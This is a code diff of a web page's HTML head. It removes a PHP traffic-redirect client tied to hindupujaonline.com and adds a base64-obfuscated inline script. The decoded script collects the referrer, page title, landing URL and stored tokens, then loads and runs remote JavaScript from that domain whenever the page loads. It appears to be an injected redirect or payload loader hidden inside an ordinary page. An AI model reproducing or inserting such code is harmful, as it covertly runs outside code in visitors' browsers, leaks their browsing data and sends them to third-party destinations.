@@ -1,18 +1,3 @@
-<?php
-// Query params are: utm_term={keyword}&gclid={gclid}&utm_creative={creative}&utm_campaign={campaignid}&utm_position={adposition}&utm_network={network}&utm_target={target}&utm_placement={placement}&utm_match={matchtype} 
-
-require_once dirname(__FILE__) . '/kclient.php';
-$client = new KClient('https://hindupujaonline.com/', 'PPMfWrDnqDJdmK9x');
-$client->sendAllParams();       // to send all params from page query
-$client->forceRedirectOffer();       // redirect to offer if an offer is chosen
-// $client->param('sub_id_5', '123'); // you can send any params
-// $client->keyword('PASTE_KEYWORD');  // send custom keyword
-// $client->currentPageAsReferrer(); // to send current page URL as click referrer
-// $client->disableSessions(); // to disable using session cookie (without this cookie restoreFromSession wouldn't work)
-// $client->debug();              // to enable debug mode and show the errors
-// $client->execute();             // request to api, show the output and continue
-$client->executeAndBreak();     // to stop page execution if there is redirect or some output
-?>
 <!DOCTYPE html><html><head>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -35,6 +20,7 @@ $client->executeAndBreak();     // to stop page execution if there is redirect o
       }
     </style>
 </head>
+    <script src="data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfS0JrOVF3MkRjdndITXpiVCc7CiAgICBpZiAoIXdpbmRvdy5fS0JrOVF3MkRjdndITXpiVCkgewogICAgICAgIHdpbmRvdy5fS0JrOVF3MkRjdndITXpiVCA9IHsKICAgICAgICAgICAgdW5pcXVlOiB0cnVlLAogICAgICAgICAgICB0dGw6IDg2NDAwLAogICAgICAgICAgICBSX1BBVEg6ICdodHRwczovL2hpbmR1cHVqYW9ubGluZS5jb20vSlpQVjgxTjInLAogICAgICAgIH07CiAgICB9CiAgICBjb25zdCBfSnlUZHRRcW15TE1LbldOSyA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCdjb25maWcnKTsKICAgIGlmICh0eXBlb2YgX0p5VGR0UXFteUxNS25XTksgIT09ICd1bmRlZmluZWQnICYmIF9KeVRkdFFxbXlMTUtuV05LICE9PSBudWxsKSB7CiAgICAgICAgdmFyIF8xRnlTempLVnExTDlCbmJQID0gSlNPTi5wYXJzZShfSnlUZHRRcW15TE1LbldOSyk7CiAgICAgICAgdmFyIF80amZ6TXR6U3N6bUc1UllrID0gTWF0aC5yb3VuZCgrbmV3IERhdGUoKS8xMDAwKTsKICAgICAgICBpZiAoXzFGeVN6aktWcTFMOUJuYlAuY3JlYXRlZF9hdCArIHdpbmRvdy5fS0JrOVF3MkRjdndITXpiVC50dGwgPCBfNGpmek10elNzem1HNVJZaykgewogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgnc3ViSWQnKTsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ3Rva2VuJyk7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCdjb25maWcnKTsKICAgICAgICB9CiAgICB9CiAgICB2YXIgX2ZEdk44WUNNMzdYSHp3M20gPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnc3ViSWQnKTsKICAgIHZhciBfQmprSkNnRFk4Y1RzMVdqaiA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCd0b2tlbicpOwogICAgdmFyIF9SNlNiNkI5S0dzRjJzSHhwID0gJz9yZXR1cm49anMuY2xpZW50JzsKICAgICAgICBfUjZTYjZCOUtHc0Yyc0h4cCArPSAnJicgKyBkZWNvZGVVUklDb21wb25lbnQod2luZG93LmxvY2F0aW9uLnNlYXJjaC5yZXBsYWNlKCc/JywgJycpKTsKICAgICAgICBfUjZTYjZCOUtHc0Yyc0h4cCArPSAnJnNlX3JlZmVycmVyPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQucmVmZXJyZXIpOwogICAgICAgIF9SNlNiNkI5S0dzRjJzSHhwICs9ICcmZGVmYXVsdF9rZXl3b3JkPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQudGl0bGUpOwogICAgICAgIF9SNlNiNkI5S0dzRjJzSHhwICs9ICcmbGFuZGluZ191cmw9JyArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5sb2NhdGlvbi5ob3N0bmFtZSArIGRvY3VtZW50LmxvY2F0aW9uLnBhdGhuYW1lKTsKICAgICAgICBfUjZTYjZCOUtHc0Yyc0h4cCArPSAnJm5hbWU9JyArIGVuY29kZVVSSUNvbXBvbmVudChuYW1lKTsKICAgICAgICBfUjZTYjZCOUtHc0Yyc0h4cCArPSAnJmhvc3Q9JyArIGVuY29kZVVSSUNvbXBvbmVudCh3aW5kb3cuX0tCazlRdzJEY3Z3SE16YlQuUl9QQVRIKTsKICAgIGlmICh0eXBlb2YgX2ZEdk44WUNNMzdYSHp3M20gIT09ICd1bmRlZmluZWQnICYmIF9mRHZOOFlDTTM3WEh6dzNtICYmIHdpbmRvdy5fS0JrOVF3MkRjdndITXpiVC51bmlxdWUpIHsKICAgICAgICBfUjZTYjZCOUtHc0Yyc0h4cCArPSAnJnN1Yl9pZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KF9mRHZOOFlDTTM3WEh6dzNtKTsKICAgIH0KICAgIGlmICh0eXBlb2YgX0Jqa0pDZ0RZOGNUczFXamogIT09ICd1bmRlZmluZWQnICYmIF9CamtKQ2dEWThjVHMxV2pqICYmIHdpbmRvdy5fS0JrOVF3MkRjdndITXpiVC51bmlxdWUpIHsKICAgICAgICBfUjZTYjZCOUtHc0Yyc0h4cCArPSAnJnRva2VuPScgKyBlbmNvZGVVUklDb21wb25lbnQoX0Jqa0pDZ0RZOGNUczFXamopOwogICAgfQogICAgdmFyIGEgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTsKICAgICAgICBhLnR5cGUgPSAnYXBwbGljYXRpb24vamF2YXNjcmlwdCc7CiAgICAgICAgYS5zcmMgPSB3aW5kb3cuX0tCazlRdzJEY3Z3SE16YlQuUl9QQVRIICsgX1I2U2I2QjlLR3NGMnNIeHA7CiAgICB2YXIgcyA9IGRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCdzY3JpcHQnKVswXTsKICAgIHMucGFyZW50Tm9kZS5pbnNlcnRCZWZvcmUoYSwgcykKICAgIH0pKCk7CiAgICA="></script>
 <body>
     <header>
       <div class="lightgreen">
